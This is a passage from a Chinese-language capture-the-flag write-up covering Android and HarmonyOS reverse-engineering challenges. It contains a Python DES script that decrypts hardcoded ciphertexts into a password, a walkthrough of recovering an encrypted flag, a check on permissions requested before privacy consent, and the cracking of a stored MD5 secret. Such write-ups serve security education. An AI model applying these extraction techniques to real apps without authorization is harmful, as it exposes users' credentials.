        return [text[i-1] for i in P_box]

    def S_transformation(self, text: list) -> list:
        """
        S_box transformation
        48-bit text -> 32-bit text
        """
        byte_6D0 = [i for j in S_box for i in j]
        v24 = int("".join(str(i) for i in text), 2)
        v25 = byte_6D0[((v24 >> 12) & 0x20 | (v24 >> 8) & 0x10 | (v24 >> 13) & 0xF) + 320]
        v26 = (16 * (byte_6D0[((v24 >> 18) & 0x20 | (v24 >> 14) & 0x10 | (v24 >> 19) & 0xF) + 256] & 0xF)) | (((16 * (byte_6D0[((v24 >> 30) & 0x20 | (v24 >> 26) & 0x10 | (v24 >> 31) & 0xF) + 128] & 0xF)) | ((byte_6D0[((v24 >> 36) & 0x20 | HIDWORD(v24) & 0x10 | (v24 >> 37) & 0xF) + 64] & 0xF | (16 * (byte_6D0[(v24 >> 42) & 0x20 | (v24 >> 38) & 0x10 | (v24 >> 43) & 0xF] & 0xF))) << 8) | byte_6D0[((v24 >> 24) & 0x20 | (v24 >> 20) & 0x10 | (v24 >> 25) & 0xF) + 192] & 0xF) << 8) | v25 & 0xF
        v27 = byte_6D0[(v24 & 0x20 | (16 * (v24 ^ 0x47)) & 0x10 | ((v24 ^ 0x47) >> 1) & 0xF) + 448]
        v28 = 16 * byte_6D0[(((v24 ^ 0x47) >> 6) & 0x20 | ((v24 ^ 0x47) >> 2) & 0x10 | (v24 >> 7) & 0xF) + 0x180]
        res = v26 << 8 | v27 | v28
        return [int(i) for i in bin(res)[2:].rjust(32, '0')]

    def Feistel(self, text: list, subkey: list) -> list:
        """
        Implement Feistel encrypt
        Expand(text) xor subkey -> S_transform -> p_permutation
        """
        if len(text) != 32 or len(subkey) != 48:
            raise Exception("[Error]The length Error")
        text = self.Expand(text)
        tmp = [i ^ j for i, j in zip(text, subkey)]
        tmp = self.S_transformation(tmp)
        tmp = self.P_permutation(tmp)

        return tmp

    def Round(self, left: list, right: list, subkey: list):
        """
        Round encryption:
        L' = R
        R' = L ^ Feistel(R, subkey)
        """
        tmp = self.Feistel(right, subkey)
        tmp = [i ^ j for i, j in zip(left, tmp)]

        return right, tmp

    def encrypt(self, plaintext: int) -> int:
        plaintext = bin(plaintext)[2:].rjust(64, "0")  # ! make up 64 bits

        m = self.Initial_permutation(plaintext)  # ! IP permutration
        left, right = m[:32], m[32:]
        for i in range(16):
            left, right = self.Round(left, right, self.subkeys[i])
        tmp = self.inv_Initial_permutation(
            right + left)  # ! inverse IP permutation
        return int("".join(str(i) for i in tmp), 2)

    def decrypt(self, ciphertext: int) -> int:
        ciphertext = bin(ciphertext)[2:].rjust(64, "0")  # ! make up 64 bits
        # ! invert the subkeys for decryption
        subkeys = self.subkeys[::-1]

        m = self.Initial_permutation(ciphertext)  # ! IP permutation
        left, right = m[:32], m[32:]
        for i in range(16):
            left, right = self.Round(left, right, subkeys[i])
        tmp = self.inv_Initial_permutation(
            right + left)  # ! inverse IP permutation
        return int("".join(str(i) for i in tmp), 2)


des = DES(key=0x3433326e316d6440)
des.keyGen()
enc = [0x8EA98C42FC03526E, 0xC242087EC46018B2, 0x79485D6700011437, 0x572FAC9E15AF400]
for i in enc:
    print(des.decrypt(i).to_bytes(8, 'little').decode(), end='')
print()
```

解密得到 password 为 `93b4001b2418fd2398ab73e51fc44968`。

完成登陆后会开启一个 `DashboardActivity`，并将 `username` 和 `password` 传给这个 intent，对 `DashboardActivity` 逆向可以发现，其核心逻辑是开启一个 NanoHTTPD 的服务，并对一个加密字符串进行解密后作为 HTTP 的内容返回。

其解密的逻辑是使用 `username||password` 的 MD5 哈希前半部分和后半部分分别作为 DES 的密钥与 IV 进行解密。我们这里直接进行解密即可：

![](images/20250403112054-a6eb44c8-103a-1.png)

flag: `flag{9d0e920a115102a8f33247e125}`

## 隐私合规

### Privacy Master（1）

> 在用户同意隐私政策前APP请求了什么信息，按照请求先后顺序回答，英文逗号分隔，回答内容为 android.permission.xxxx 后面的xxxx 大写回答（以安卓11参考回答，**请注意提交次数限制**）

根据 mainfest 找到主函数，可以看到在同意隐私政策（PRIVACY\_POLICY\_AGREED）前调用了`checkAndRequestPermissions`函数：

![](images/20250403112055-a7ea973c-103a-1.png)

进入查看，可以看到依次了 READ\_PHONE\_STATE,ACCESS\_FINE\_LOCATION：

![](images/20250403112057-a910660d-103a-1.png)

故答案为 `READ_PHONE_STATE,ACCESS_FINE_LOCATION`

### Harmony

> 鸿蒙开发人员由于开发疏忽，不正确的使用了危险函数，导致用户凭证泄露，找出关键点，按程序提示提交答案

可以看到主逻辑是比较 md5 值：

![](images/20250403112059-aa2e2395-103a-1.png)

在 `com.hmos.exam1/entry/ets/pages.Index#aboutToAppear` 中可以看到给 `storedHash` 的赋值语句，并且通过创建对象从系统资源管理器中获取一个文件：

![](images/20250403112101-ab51c05c-103a-1.png)

在解压的文件包中看到 `resources.index` 文件，存有一个 secret 字段：

![](images/20250403112103-ac618873-103a-1.png)

cmd5 查询：

![](images/20250403112105-ad5ddeb3-103a-1.png)

flag 为 `Flag{md5(goodgood16f85293e920fd49eda6bf0df98bfd33)}` 即 `Flag{ee51e080d1db85f9927fe87aa92267bb}`
